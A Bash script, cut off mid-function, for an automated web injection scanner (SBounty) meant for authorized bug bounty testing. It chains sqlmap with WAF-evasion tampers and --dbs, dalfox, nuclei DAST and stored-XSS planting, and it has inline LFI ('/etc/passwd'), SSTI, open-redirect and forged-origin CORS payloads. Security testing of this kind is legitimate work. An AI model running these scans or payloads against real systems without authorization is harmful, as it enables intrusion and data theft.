#!/bin/bash
{ # TODO el cuerpo va dentro de este grupo { }: bash lo lee ENTERO en memoria antes de ejecutar nada,
  # asi editar el fichero MIENTRAS corre (o un git pull a mitad) NO corrompe la ejecucion en curso. El
  # cierre '}' esta en la ultima linea. Es transparente (no es subshell): funciones, traps y exit igual.
#
# SBounty - active-injection DAST scanner for authorized targets.
#
# Role split: recon-sub owns surface discovery (subdomains, liveness, tech, ports, takeover,
# known-CVE nuclei). SBounty takes a target you already chose and FUZZES its parameters.
#
# Strategy: acquire a high-quality corpus (crawl + history + hidden-param mining, deduped by
# parameter signature and filtered to live hosts) and feed it to best-in-class engines:
#   - nuclei -dast : broad core (XSS/SQLi/SSTI/LFI/redirect/SSRF/CRLF/cmdi in query/path/headers/
#                    cookie; GET; automatic OOB via interactsh).
#   - dalfox       : XSS depth (reflected/DOM, context-aware, blind).
#   - sqlmap       : SQLi depth, tuned (--flush-session, tamper chain, balanced level/risk, threaded);
#                    POST/forms tested on the crawled dynamic pages (login auth-bypass, register...).
#   - stored-xss   : persistent XSS (plants a canary in params+forms, re-checks for the RAW breakout).
#   - secrets      : high-confidence secrets (cloud/VCS/Stripe/SendGrid/private keys) in JS/JSON/map.
#   - cors         : CORS bypass variants.
# Authenticated scan: -H "Cookie: ..." flows to the crawl/arjun/engines (surface behind a login).
# Detects WAF/CDN up front (red warning) and tries to find the real origin behind it. Engines run in
# parallel with rate limits; every tool is optional (graceful skip). Logged; -D traces commands/rc.

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/config.ini"

bred='\033[1;31m'; bblue='\033[1;34m'; bgreen='\033[1;32m'; byellow='\033[1;33m'; bcyan='\033[1;36m'
red='\033[0;31m'; green='\033[0;32m'; yellow='\033[0;33m'; dim='\033[2m'; reset='\033[0m'

DEBUG=0; LOGFILE=""
have(){ command -v "$1" >/dev/null 2>&1; }
_log(){ [ -n "$LOGFILE" ] && printf '%s %s\n' "$(date +%T)" "$(printf '%s' "$1" | sed -E 's/[\]033\[[0-9;]*m//g')" >> "$LOGFILE" 2>/dev/null; }   # sin codigos de color
info(){ printf "${bblue}[*]${reset} %b\n" "$1"; _log "[*] $1"; }
good(){ printf "${bgreen}[+]${reset} %b\n" "$1"; _log "[+] $1"; }
warn(){ printf "${byellow}[!]${reset} %b\n" "$1"; _log "[!] $1"; }
skip(){ printf "${yellow}[-]${reset} %b (skipped)\n" "$1"; _log "[-] $1 (skipped)"; }
dbg(){  [ "$DEBUG" = "1" ] && printf "${dim}[D] %b${reset}\n" "$1"; _log "[D] $1"; }
rule(){ printf "\n${bcyan}%b %s${reset} ${dim}%s${reset}\n" "━━━━━" "$1" "$2"; _log "=== $1 ${2:-}"; }
fmt_time(){   # segundos -> "Hh MMm SSs" / "Mm SSs" / "Ss" segun aplique (no numerico -> tal cual)
    local s="${1:-0}" h m
    case "$s" in ''|*[!0-9]*) printf '%s' "${1:-?}"; return;; esac
    if [ "$s" -lt 60 ]; then printf '%ss' "$s"; return; fi
    h=$((s/3600)); m=$(((s%3600)/60)); s=$((s%60))
    if [ "$h" -gt 0 ]; then printf '%dh %02dm %02ds' "$h" "$m" "$s"; else printf '%dm %02ds' "$m" "$s"; fi
}

# Clean Ctrl-C: TERM then KILL each engine and its tool children, clean temp, exit 130.
ENGINE_PIDS=""; MON_PIDS=(); MON_NAMES=(); CRAWL_PIDS=(); CRAWL_NAMES=()
_killtree(){ local p="$1" sig="${2:-TERM}" c; for c in $(pgrep -P "$p" 2>/dev/null); do _killtree "$c" "$sig"; done; kill -"$sig" "$p" 2>/dev/null; }
_cleanup(){
    trap - INT TERM
    printf "\n${byellow}[!]${reset} Interrumpido: deteniendo motores (guardando lo obtenido)...\n"; _log "[!] interrumpido (Ctrl-C)"
    local p list="$ENGINE_PIDS ${CRAWL_PIDS[*]} $(jobs -p 2>/dev/null)"
    for p in $list; do _killtree "$p" TERM; done
    sleep 1
    for p in $list; do _killtree "$p" KILL; done
    if [ -n "$results_path" ] && [ -d "$results_path" ]; then
        printf "\n${bcyan}━━━━━ PARCIAL (interrumpido) %s${reset}\n" "${host:-}"
        local f n
        for f in nuclei-dast dalfox sqlmap stored-xss secrets cors; do
            [ -f "$results_path/$f.txt" ] || continue
            n=$(count_hits "$f" "$results_path/$f.txt")
            if [ "${n:-0}" -gt 0 ]; then printf "  ${bred}%-12s %s hit(s) parcial${reset} -> %s\n" "$f" "$n" "$results_path/$f.txt"
            else printf "  ${dim}%-12s sin hallazgos aun${reset}\n" "$f"; fi
        done
        printf "  ${dim}corpus hasta aqui: %s URLs · log: %s${reset}\n" "$(wc -l < "$results_path/urls.txt" 2>/dev/null | tr -d ' ')" "$LOGFILE"
        show_findings parcial
        _log "[=] parcial guardado en $results_path"
        rm -rf "$results_path/.crawl" "$results_path"/.arjun_* "$results_path/.alive" "$results_path"/.start.* 2>/dev/null
    fi
    exit 130
}

banner(){
printf "\n${bcyan}"
printf " ____  ____                    _             \n"
printf "/ ___|| __ )  ___  _   _ _ __ | |_ _   _     \n"
printf "\___ \|  _ \ / _ \| | | | '_ \| __| | | |    \n"
printf " ___) | |_) | (_) | |_| | | | | |_| |_| |    \n"
printf "|____/|____/ \___/ \__,_|_| |_|\__|\__, |    \n"
printf "                                   |___/     \n"
printf "        active-injection DAST  ${dim}· by Shockz${reset}${bcyan}\n${reset}"
}

help(){
printf "\n${bcyan}SBounty${reset} - escaner de inyeccion activa (DAST) para bug bounty ${bred}CON permiso${reset}.\n"
printf "  ${dim}recon-sub hace el recon; SBounty toma un objetivo y fuzzea sus parametros.${reset}\n"
printf "  ${dim}Flujo: probe -> WAF/CDN -> adquiere (crawl+historico+params) -> motores en paralelo -> resumen.${reset}\n"
printf "\n${bcyan}━━━━━ 1 · OBJETIVO ━━━━━${reset}  ${dim}(elige UNO)${reset}\n"
printf "  ${bgreen}-s${reset} target     un host/subdominio ${dim}(tesla.com): crawl del host ENTERO + flujo completo${reset}\n"
printf "  ${bgreen}-url${reset} URL       una URL concreta ${dim}(https://x.com/app/login): esa URL + sus llamadas directas (crawl shallow, sin gau/wayback del host)${reset}\n"
printf "  ${bgreen}-l${reset} file       fichero de objetivos, hosts y/o URLs mezclados ${dim}(tiempo por objetivo + total)${reset}\n"
printf "  ${bgreen}-f${reset} urls_file  fichero de URLs crudas ${dim}(sin crawl/mining; SI sanea + dedup + liveness)${reset}\n"
printf "\n${bcyan}━━━━━ 2 · OPCIONES ━━━━━${reset}\n"
printf "  ${bgreen}-H${reset} \"N: v\"     cabecera HTTP en las pruebas ${dim}(p.ej. una cookie de sesion)${reset}\n"
printf "  ${bgreen}-p${reset}            motores en SECUENCIA ${dim}(por defecto: en paralelo, con rate-limit)${reset}\n"
printf "  ${bgreen}-D${reset}            modo DEBUG ${dim}(traza comando y rc de cada tool; stderr -> log)${reset}\n"
printf "  ${bgreen}-no-caps${reset}      ${dim}sin topes de tiempo ni recuento (crawl/arjun/motores corren hasta terminar; tarda mas)${reset}\n"
printf "  ${bgreen}-h${reset}            esta ayuda\n"
printf "\n${bcyan}━━━━━ 3 · EJEMPLOS ━━━━━${reset}\n"
printf "  %s -s tesla.com                            ${dim}# un host entero${reset}\n" "$0"
printf "  %s -s https://shop.tesla.com/app/login     ${dim}# una ruta concreta (sus llamadas)${reset}\n" "$0"
printf "  %s -l targets.txt -H \"Cookie: s=abc\"       ${dim}# lista, con cabecera${reset}\n" "$0"
printf "  %s -f urls.txt -p -D                       ${dim}# URLs crudas, secuencial, con debug${reset}\n" "$0"
printf "\n${bcyan}━━━━━ MOTORES Y CONFIG ━━━━━${reset}  ${dim}(config.ini; una clase a 'false' simplemente no corre)${reset}\n"
printf "  ${bgreen}dast${reset}       nuclei -dast: ancho ${dim}(XSS/SQLi/SSTI/LFI/redirect/SSRF/CRLF/cmdi; OOB auto)${reset}\n"
printf "  ${bgreen}xss_deep${reset}   dalfox ${dim}(XSS reflejado/DOM)${reset}     ${bgreen}sqli_deep${reset}   sqlmap ${dim}(SQLi GET + POST/forms)${reset}\n"
printf "  ${bgreen}stored_xss${reset} XSS almacenado ${dim}(planta canary; ESCRIBE)${reset}  ${bgreen}secrets${reset}  ${dim}secretos en JS/JSON${reset}\n"
printf "  ${bgreen}cors${reset}       CORS mejorado             ${bgreen}param_mining${reset}  arjun ${dim}(params ocultos)${reset}\n"
printf "  ${bgreen}waf_check${reset}  WAF/CDN + bypass al origen ${dim}(auto al inicio; rojo si hay WAF)${reset}\n"
printf "  ${dim}Auth: -H \"Cookie: ...\" llega tambien al crawl/arjun -> escanea la superficie tras login.${reset}\n"
printf "  ${dim}Caps: SB_ENGINE_CAP=600s/motor; sqlmap adapta profundidad+timeout a la latencia medida y${reset}\n"
printf "  ${dim}      comparte presupuesto GET+forms (total <= cap). Forzar: SB_SQLI_LEVEL/RISK, SB_ENGINE_CAP.${reset}\n"
printf "\n${bcyan}━━━━━ SALIDAS ━━━━━${reset}\n"
printf "  ${dim}results/<host>/{nuclei-dast,dalfox,sqlmap,stored-xss,secrets,cors}.txt  ·  urls.txt  ·  sbounty.log${reset}\n\n"
}
out(){ help; exit; }

############################  TOOL VALIDATION / AUTO-INSTALL (recon-sub style)  ##########
ensure_go_path(){
    local gb; gb="$(go env GOPATH 2>/dev/null)/bin"; [ -d "$gb" ] || gb="$HOME/go/bin"
    case ":$PATH:" in *":$gb:"*) ;; *) export PATH="$PATH:$gb" ;; esac
}
ensure_go(){
    if have go; then ensure_go_path; return 0; fi
    info "Installing Go..."
    local v; v=$(curl -L -s https://go.dev/VERSION?m=text | head -1)
    [ -z "$v" ] && { warn "could not resolve Go version; install Go manually"; return 1; }
    wget -q "https://dl.google.com/go/${v}.linux-amd64.tar.gz" -O /tmp/go.tgz || return 1
    sudo tar -C /usr/local -xzf /tmp/go.tgz && rm -f /tmp/go.tgz
    sudo ln -sf /usr/local/go/bin/go /usr/local/bin/go 2>/dev/null
    export GOROOT=/usr/local/go GOPATH="$HOME/go"; ensure_go_path
    local rc=~/".$(basename "$SHELL")rc"
    grep -q 'Golang vars (sbounty)' "$rc" 2>/dev/null || cat >> "$rc" <<'EOF'
# Golang vars (sbounty)
export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$HOME/.local/bin:$PATH
EOF
    have go && good "Go installed"
}
ensure_gf_patterns(){
    [ -d ~/.gf ] && return 0
    git clone -q https://github.com/1ndianl33t/Gf-Patterns /tmp/gfp 2>/dev/null \
        && mkdir -p ~/.gf && mv /tmp/gfp/*.json ~/.gf 2>/dev/null && rm -rf /tmp/gfp && good "gf-patterns installed"
}
install(){
    rule "TOOLING" "validando el toolset (instala lo que falte)"
    ensure_go; ensure_gf_patterns
    declare -A INSTALL
    INSTALL[gau]="go install github.com/lc/gau/v2/cmd/gau@latest"
    INSTALL[waybackurls]="go install github.com/tomnomnom/waybackurls@latest"
    INSTALL[katana]="go install github.com/projectdiscovery/katana/cmd/katana@latest"
    INSTALL[hakrawler]="go install github.com/hakluke/hakrawler@latest"
    INSTALL[httpx]="go install github.com/projectdiscovery/httpx/cmd/httpx@latest"
    INSTALL[qsreplace]="go install github.com/tomnomnom/qsreplace@latest"
    INSTALL[gf]="go install github.com/tomnomnom/gf@latest"
    INSTALL[dalfox]="go install github.com/hahwul/dalfox/v2@latest"
    INSTALL[nuclei]="go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
    INSTALL[uro]="pipx install uro 2>/dev/null || pip3 install uro --break-system-packages"
    INSTALL[arjun]="pipx install arjun 2>/dev/null || pip3 install arjun --break-system-packages"
    INSTALL[sqlmap]="sudo apt-get install -y sqlmap"
    INSTALL[wafw00f]="pipx install wafw00f 2>/dev/null || pip3 install wafw00f --break-system-packages"
    local t missing=0
    for t in "${!INSTALL[@]}"; do
        have "$t" && continue
        missing=$((missing+1))
        printf "  installing %-18s" "$t..."
        eval "${INSTALL[$t]}" >/dev/null 2>&1; ensure_go_path
        have "$t" && printf "${green}ok${reset}\n" || printf "${red}failed${reset} ${dim}(capability skipped)${reset}\n"
    done
    [ "$missing" -eq 0 ] && good "toolset complete"
    if have nuclei && [ ! -d "$HOME/.local/nuclei-templates" ]; then
        info "fetching nuclei templates (first run)..."; nuclei -update-templates -silent >/dev/null 2>&1
    fi
}

############################  ACQUISITION  ##############################################
scope_filter(){ grep -E "^https?://([a-z0-9.-]*\.)?${host_re}([:/?#]|$)"; }

# Tira URLs rotas por el crawl/wayback (artefactos de concatenacion, whitespace, basura en la RUTA).
# Solo se inspecciona la RUTA (antes del '?'): la basura en un VALOR la neutraliza dedup_by_params
# (payload -> '1'), asi que filtrar por un caracter del valor mataria endpoints reales (open-redirect
# ?r=http://..., ?name=<script>). El 2do 'http' valido vive tras '?' (parametro), el roto va en la ruta.
sanitize_urls(){
    grep -avE '^https?://[^?]*https?://' \
    | grep -avE '[[:space:]]|[[:cntrl:]]' \
    | grep -avE "^https?://[^?]*['\"<>\`{}*\\\\]"
}

dedup_by_params(){   # one URL per (scheme, host, path, sorted param-keys). Normaliza el puerto por
                     # defecto (host:80 == host, evita doble escaneo) y LIMPIA valores: un payload
                     # archivado de wayback (union/<script>/comillas/largo) se pone a '1', asi colapsan
                     # variantes del mismo endpoint y los motores reciben valores limpios (adios al
                     # prompt "has boundaries?" de sqlmap). Fallback sin python: sort -u.
    if have python3; then
        python3 - "$1" <<'PY'
import sys, re
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode, unquote
DEF={'http':'80','https':'443'}
JUNK=re.compile(r"""['"<>()]|--|/\*|\.\.|\bunion\b|\bselect\b|\bsleep\b|\balert\b|script|concat|information_schema|xp_cmdshell|benchmark|onerror|onload|%[0-9a-fA-F]{2}""", re.I)
def clean(v):
    d=unquote(v)
    if (not d) or len(d)>40 or JUNK.search(d) or any(c.isspace() for c in d): return '1'
    return v
seen=set()
for line in open(sys.argv[1], encoding="utf-8", errors="ignore"):
    u=line.strip()
    if not u: continue
    try: s=urlsplit(u)
    except Exception: continue
    scheme=(s.scheme or 'http').lower(); host=(s.hostname or '').lower()
    if not host: continue
    netloc=host if (not s.port or str(s.port)==DEF.get(scheme,'')) else "%s:%d"%(host,s.port)
    pairs=parse_qsl(s.query, keep_blank_values=True)
    keys=tuple(sorted(k for k,_ in pairs))
    sig=(scheme, netloc, s.path, keys)
    if sig in seen: continue
    seen.add(sig)
    vmap={}
    for k,v in pairs: vmap.setdefault(k, clean(v))
    print(urlunsplit((scheme, netloc, s.path, urlencode([(k, vmap[k]) for k in keys]), '')))
PY
    else sort -u "$1"; fi
}
mine_params(){
    [ "$param_mining" = "true" ] || return 0
    [ "${CRAWL_FOCUS:-0}" = 1 ] && return 0   # -url enfocado: sin minado host-wide (solo las llamadas de la URL)
    have arjun || { skip "arjun (param mining)"; return 0; }
    info "mining hidden parameters (arjun)..."
    cut -d/ -f1-3 "$urls_output_path" | sort -u | head -40 > "$results_path/.arjun_in"
    [ -s "$results_path/.arjun_in" ] || return 0
    local arj_hdr=(); [ -n "$headers" ] && arj_hdr=(--headers "$headers")   # auth: minado con sesion
    # Tope de tiempo: arjun prueba ~25k nombres de param contra el host; en un objetivo LENTO eso dispara
    # la fase prep (medido: 5m35s a 702ms/req). Lo acota como el crawl (SB_ARJUN_CAP); si capa, los params
    # del crawl siguen ahi. Es un techo: un objetivo rapido termina mucho antes y el cap ni se nota.
    dbg "arjun -i .arjun_in -oT .arjun_out (cap ${SB_ARJUN_CAP:-120}s) ${arj_hdr[*]}"
    timeout "${SB_ARJUN_CAP:-120}" arjun -i "$results_path/.arjun_in" -oT "$results_path/.arjun_out" "${arj_hdr[@]}" >/dev/null 2>>"$LOGFILE"
    [ $? -eq 124 ] && warn "arjun: tope de tiempo (SB_ARJUN_CAP=${SB_ARJUN_CAP:-120}s), params parciales"
    [ -s "$results_path/.arjun_out" ] && cat "$results_path/.arjun_out" >> "$urls_output_path"
    rm -f "$results_path/.arjun_in" "$results_path/.arjun_out"
}
liveness_filter(){
    have httpx || return 0
    local tmp="$results_path/.alive"
    httpx -silent -mc 200,201,202,204,301,302,307,308,401,403,405,500 "${httpx_hdr[@]}" \
        < "$urls_output_path" > "$tmp" 2>>"$LOGFILE"
    [ -s "$tmp" ] && mv "$tmp" "$urls_output_path" || rm -f "$tmp"
}
crawl_monitor(){     # live crawl progress: elapsed/cap + per-source URL count (⟳ running / ✓ done)
    local d="$1" cap="$2" t=0 i nm any line n
    while :; do
        any=0; for i in "${!CRAWL_PIDS[@]}"; do kill -0 "${CRAWL_PIDS[$i]}" 2>/dev/null && any=1; done
        [ "$any" = 0 ] && break
        sleep 4; t=$((t+4))
        [ $((t % 8)) -eq 0 ] || continue
        line=""
        for i in "${!CRAWL_PIDS[@]}"; do
            nm="${CRAWL_NAMES[$i]}"; n=0; [ -f "$d/$nm" ] && n=$(wc -l < "$d/$nm" 2>/dev/null | tr -d ' ')
            if kill -0 "${CRAWL_PIDS[$i]}" 2>/dev/null; then line="$line ${bcyan}⟳${reset}$nm${dim}($n)${reset}"
            else line="$line ${green}✓${reset}$nm${dim}($n)${reset}"; fi
        done
        printf "${dim}  ..crawl %ss/%ss${reset}%b\n" "$t" "$cap" "$line"
    done
}
crawl_source(){      # $1 = seed; writes merged raw URLs to $results_path/.raw with live progress
    local seed="$1" d="$results_path/.crawl" cap="${SB_CRAWL_CAP:-180}"; rm -rf "$d"; mkdir -p "$d"
    CRAWL_PIDS=(); CRAWL_NAMES=()
    dbg "crawl (cap ${cap}s): gau/waybackurls/katana/hakrawler on $seed"
    # Modo AUTENTICADO: si hay cabecera (-H "Cookie: ..."), se pasa al crawl ACTIVO (katana/hakrawler)
    # para descubrir la superficie tras login. gau/wayback son pasivos (archivos), no la necesitan.
    local kat_hdr=() hak_hdr=(); [ -n "$headers" ] && { kat_hdr=(-H "$headers"); hak_hdr=(-h "$headers"); }
    # Modo ENFOCADO (-url): gau/waybackurls son del HOST ENTERO -> se OMITEN, y el crawl activo va
    # shallow (depth 1) DESDE la URL, para quedarnos con la URL + sus llamadas DIRECTAS, no todo el host.
    local _depth=3; [ "${CRAWL_FOCUS:-0}" = 1 ] && _depth="${SB_FOCUS_DEPTH:-1}"
    if [ "${CRAWL_FOCUS:-0}" != 1 ]; then
        if have gau;         then timeout "$cap" gau "$host" --threads 10 >"$d/gau" 2>>"$LOGFILE" &               CRAWL_PIDS+=($!); CRAWL_NAMES+=(gau); fi
        if have waybackurls; then timeout "$cap" waybackurls "$host" >"$d/wayback" 2>>"$LOGFILE" &                CRAWL_PIDS+=($!); CRAWL_NAMES+=(wayback); fi
    fi
    if have katana;      then timeout "$cap" katana -u "$seed" "${kat_hdr[@]}" -jc -kf all -d "$_depth" -silent >"$d/katana" 2>>"$LOGFILE" & CRAWL_PIDS+=($!); CRAWL_NAMES+=(katana); fi
    if have hakrawler;   then ( echo "$seed" | timeout "$cap" hakrawler "${hak_hdr[@]}" -d "$_depth" -insecure >"$d/hakrawler" 2>>"$LOGFILE" ) & CRAWL_PIDS+=($!); CRAWL_NAMES+=(hakrawler); fi
    crawl_monitor "$d" "$cap"
    wait
    cat "$d"/* 2>/dev/null > "$results_path/.raw"; rm -rf "$d"
    CRAWL_PIDS=(); CRAWL_NAMES=()
}
build_corpus(){      # $1 = seed; produces $urls_output_path. Records per-phase times.
    local seed="$1" t n
    if [ -s "$urls_output_path" ]; then
        warn "URLs file exists, reusing: $urls_output_path"
        echo 0 > "$results_path/.t.crawl"; echo "$(wc -l < "$urls_output_path" | tr -d ' ')" > "$results_path/.n.acquire"; return 0
    fi
    info "acquiring routes & parameters for ${bcyan}$host${reset} ..."
    t=$(date +%s); info "  ${dim}[1/4]${reset} crawl (katana/gau/wayback/hakrawler)"
    crawl_source "$seed"; echo "$(( $(date +%s) - t ))" > "$results_path/.t.crawl"
    t=$(date +%s); info "  ${dim}[2/4]${reset} normalize (uro + scope) + mine params (arjun) + dedup"
    { have uro && uro || cat; } < "$results_path/.raw" | sort -u | scope_filter | sanitize_urls > "$urls_output_path"; rm -f "$results_path/.raw"
    mine_params
    dedup_by_params "$urls_output_path" > "$urls_output_path.d" && mv "$urls_output_path.d" "$urls_output_path"
    if [ "${SB_MAX_URLS:-0}" -gt 0 ] && [ "$(wc -l < "$urls_output_path")" -gt "$SB_MAX_URLS" ]; then
        head -n "$SB_MAX_URLS" "$urls_output_path" > "$urls_output_path.c" && mv "$urls_output_path.c" "$urls_output_path"
        warn "corpus capped to SB_MAX_URLS=$SB_MAX_URLS"
    fi
    echo "$(( $(date +%s) - t ))" > "$results_path/.t.prep"
    t=$(date +%s); info "  ${dim}[3/4]${reset} liveness (httpx) on $(wc -l < "$urls_output_path" | tr -d ' ') URL(s)"
    liveness_filter; echo "$(( $(date +%s) - t ))" > "$results_path/.t.liveness"
    n=$(wc -l < "$urls_output_path" | tr -d ' '); echo "$n" > "$results_path/.n.acquire"
    good "  ${dim}[4/4]${reset} corpus ready: ${bcyan}$n${reset} URL(s) with parameters."
}

############################  ENGINES  #################################################
broad_scan(){
    local out="$results_path/nuclei-dast.txt"
    if have nuclei; then
        dbg "nuclei -l urls.txt -dast -rl ${SB_NUCLEI_RL:-60} -c ${SB_NUCLEI_C:-25} (cap ${SB_ENGINE_CAP:-600}s) ${nuclei_hdr[*]}"
        timeout "${SB_ENGINE_CAP:-600}" nuclei -l "$urls_output_path" -dast -silent -rl "${SB_NUCLEI_RL:-60}" -c "${SB_NUCLEI_C:-25}" "${nuclei_hdr[@]}" -o "$out" >/dev/null 2>>"$LOGFILE"
        [ $? -eq 124 ] && { warn "nuclei-dast: tope de tiempo (SB_ENGINE_CAP=${SB_ENGINE_CAP:-600}s), resultado parcial"; : > "$results_path/.cap.nuclei-dast"; }
    else
        skip "nuclei absent -> lightweight native LFI/SSTI/open-redirect fallback"
        native_fallback > "$out" 2>>"$LOGFILE"
    fi
}
native_fallback(){   # only used when nuclei is missing; grep-based, low precision
    have gf && have qsreplace || return 0
    local url
    gf lfi < "$urls_output_path" 2>/dev/null | qsreplace "../../../../../../etc/passwd" | while read -r url; do
        curl "${curl_hdr[@]}" -sk "$url" 2>/dev/null | grep -q "root:x:0:0" && echo "[LFI] $url"; done
    gf ssti < "$urls_output_path" 2>/dev/null | qsreplace "{{9955*9955}}" | while read -r url; do
        curl "${curl_hdr[@]}" -sk "$url" 2>/dev/null | grep -q "99102025" && echo "[SSTI] $url"; done
    have httpx && gf redirect < "$urls_output_path" 2>/dev/null | qsreplace "https://evil.example" \
        | httpx "${httpx_hdr[@]}" -silent -location -mc 301,302,303,307,308 2>/dev/null | grep -i 'evil\.example' \
        | sed 's/^/[OPENREDIR] /'
}
# Un fichero estatico (.txt/.jpg/.css/.js/fuente/media) NO procesa query params: meterlo en el feed de
# inyeccion gasta el cap de sqlmap/dalfox en algo 0% inyectable (p.ej. sqlmap quemandose en un
# fichero .txt estatico). Se excluye del feed de los motores CAROS; nuclei (rapido) sigue viendo todo.
no_static(){ grep -ivE '^https?://[^?]*\.(txt|html?|jpe?g|png|gif|svg|ico|bmp|webp|avif|css|woff2?|ttf|eot|otf|pdf|zip|gz|tar|rar|7z|mp3|mp4|webm|mov|map)(\?|$)'; }
xss_deep(){
    local out="$results_path/dalfox.txt"; : > "$out"
    have dalfox || { skip "XSS depth (need dalfox)"; return; }
    # Only URLs with query params (dalfox fuzzes params) y sin ficheros estaticos (no inyectables).
    local urls="$results_path/.xss_urls"; grep -E '\?[^#[:space:]]*=' "$urls_output_path" 2>/dev/null | no_static > "$urls"
    [ -s "$urls" ] || { info "dalfox: no URLs with query params"; : > "$out"; rm -f "$urls"; return; }
    local blind=(); [ -n "$blind_xss_url" ] && blind=(-b "$blind_xss_url")
    # --skip-mining-all: NO re-descubrir params (ya los minamos con arjun y solo pasamos URLs con
    # params) -> gran recorte de peticiones. --skip-bav: sin checks de otras vulns. Rápido y al grano.
    dbg "dalfox file .xss_urls ($(wc -l <"$urls" | tr -d ' ') param-urls, cap ${SB_ENGINE_CAP:-600}s) --skip-bav --skip-mining-all ${blind[*]} ${dalfox_hdr[*]}"
    timeout "${SB_ENGINE_CAP:-600}" dalfox file "$urls" --silence --no-spinner --skip-bav --skip-mining-all --worker "${SB_DALFOX_WORKER:-100}" --timeout "${SB_REQ_TIMEOUT:-10}" "${blind[@]}" "${dalfox_hdr[@]}" -o "$out" >/dev/null 2>>"$LOGFILE"
    [ $? -eq 124 ] && { warn "dalfox: tope de tiempo (SB_ENGINE_CAP=${SB_ENGINE_CAP:-600}s), resultado parcial"; : > "$results_path/.cap.dalfox"; }
    rm -f "$urls"
}
sqli_deep(){
    local out="$results_path/sqlmap.txt"
    have sqlmap || { skip "SQLi depth (need sqlmap)"; : > "$out"; return; }
    local urls="$results_path/sqli_urls.txt"; : > "$out"
    # Afinado para VELOCIDAD con señal: --technique=BEU (boolean/error/union, rápidas; se omiten
    # time-based y stacked, que son LO lento -> SLEEP por param; actívalas con SB_SQLI_TECH=BEUSTQ),
    # multihilo, cadena de tampers anti-WAF, level/risk 3/2, --flush-session. Las cabeceras las cubre
    # nuclei -dast. --dbs es la prueba al acertar. Todo override por env (SB_SQLI_*).
    # Profundidad ADAPTATIVA a la latencia medida en el probe: un objetivo LENTO con level 3/risk 2
    # (cientos de req por parametro) capa sin terminar; mejor un scan COMPLETO mas superficial que uno
    # profundo cortado a medias. Rapido -> profundo. Override con SB_SQLI_LEVEL/RISK.
    local auto_lvl=3 auto_rsk=2; [ "${TARGET_LAT_MS:-500}" -ge 800 ] && { auto_lvl=2; auto_rsk=1; }
    local lvl="${SB_SQLI_LEVEL:-$auto_lvl}" rsk="${SB_SQLI_RISK:-$auto_rsk}" thr="${SB_SQLI_THREADS:-10}"
    local tech="${SB_SQLI_TECH:-BEU}" tamper="${SB_SQLI_TAMPER:-between,randomcase,space2comment}"
    # --timeout adaptativo a la latencia (SB_REQ_TIMEOUT) + --retries 1 = fail-fast en URLs muertas sin
    # castigar a un objetivo lento-pero-vivo. Override SB_SQLI_TIMEOUT/RETRIES.
    local common=(--batch -v0 --flush-session --random-agent --threads "$thr"
                  --timeout "${SB_SQLI_TIMEOUT:-${SB_REQ_TIMEOUT:-10}}" --retries "${SB_SQLI_RETRIES:-1}"
                  --level "$lvl" --risk "$rsk" --technique="$tech" --tamper="$tamper" --dbs "${sqlmap_hdr[@]}" "${sqlmap_host[@]}")
    # gf-narrowed SQLi candidates; fall back to any URL WITH params (never paramless = wasted).
    { have gf && gf sqli < "$urls_output_path" 2>/dev/null; } | no_static > "$urls"
    [ -s "$urls" ] || grep -E '\?[^#[:space:]]*=' "$urls_output_path" 2>/dev/null | no_static > "$urls"
    local cap="${SB_ENGINE_CAP:-600}" t0; t0=$(date +%s)
    if [ -s "$urls" ]; then
        dbg "sqlmap -m sqli_urls ($(wc -l <"$urls" | tr -d ' ') urls, cap ${cap}s) --level $lvl --risk $rsk --tamper=$tamper (lat ~${TARGET_LAT_MS:-?}ms)"
        timeout "$cap" stdbuf -oL sqlmap -m "$urls" "${common[@]}" >"$out" 2>>"$LOGFILE"
        [ $? -eq 124 ] && { warn "sqlmap GET: tope de tiempo (${cap}s), resultado parcial"; : > "$results_path/.cap.sqlmap"; }
    else info "sqlmap: no URLs with params for GET-based SQLi"; fi
    # POST/forms: comparte el MISMO presupuesto que el GET (total sqlmap <= cap, como el resto de motores,
    # ya no 2x). Apunta a las PAGINAS DINAMICAS ya crawleadas (no re-crawlea) -> llega al login. Con la
    # profundidad adaptativa, en un objetivo lento el GET termina antes y deja presupuesto para esto.
    if [ "${SB_SQLI_FORMS:-1}" = "1" ]; then
        local left=$(( cap - ( $(date +%s) - t0 ) ))
        if [ "$left" -lt 30 ]; then
            info "sqlmap forms: el pase GET consumio el presupuesto (${cap}s), formularios omitidos"
        else
            local forms="$results_path/.form_pages"
            { awk -F'?' '{print $1}' "$urls_output_path" | grep -iE '\.(asp|aspx|php|jsp|jspx|do|action|cfm|cgi|pl)$'
              printf '%s\n' "${seed_url%%\?*}"; } | sort -u > "$forms"
            if [ -s "$forms" ]; then
                dbg "sqlmap -m form_pages ($(wc -l <"$forms" | tr -d ' ') paginas) --forms (presupuesto restante ${left}s)"
                timeout "$left" stdbuf -oL sqlmap -m "$forms" "${common[@]}" --forms >>"$out" 2>>"$LOGFILE"
                [ $? -eq 124 ] && { warn "sqlmap forms: tope de tiempo (${left}s restantes), resultado parcial"; : > "$results_path/.cap.sqlmap"; }
            fi
            rm -f "$forms"
        fi
    fi
}
cors_scan(){
    local out="$results_path/cors.txt"; : > "$out"; local url origin
    # CORS does not depend on query params: test ONE URL per unique (scheme+host+path) -> far fewer requests.
    local targets="$results_path/.cors_targets"; awk -F'?' '{print $1}' "$urls_output_path" | sort -u | head -n "${SB_CORS_MAX:-200}" > "$targets"
    local deadline=$(( $(date +%s) + ${SB_ENGINE_CAP:-600} ))   # cota total: es un bucle bash, no una tool con timeout
    while read -r url; do
        [ -z "$url" ] && continue
        [ "$(date +%s)" -ge "$deadline" ] && { warn "cors: tope de tiempo (SB_ENGINE_CAP=${SB_ENGINE_CAP:-600}s), parcial"; : > "$results_path/.cap.cors"; break; }
        for origin in "https://evil.example" "null" "https://${host}.evil.example" "https://evil${host}"; do
            local resp acao; resp=$(curl "${curl_hdr[@]}" -sk -m "${SB_CORS_TIMEOUT:-8}" -I -H "Origin: $origin" "$url" 2>/dev/null)
            acao=$(printf '%s' "$resp" | grep -i '^access-control-allow-origin:' | tr -d '\r' | awk '{print $2}')
            if [ -n "$acao" ] && { [ "$acao" = "$origin" ] || [ "$acao" = "*" ]; }; then
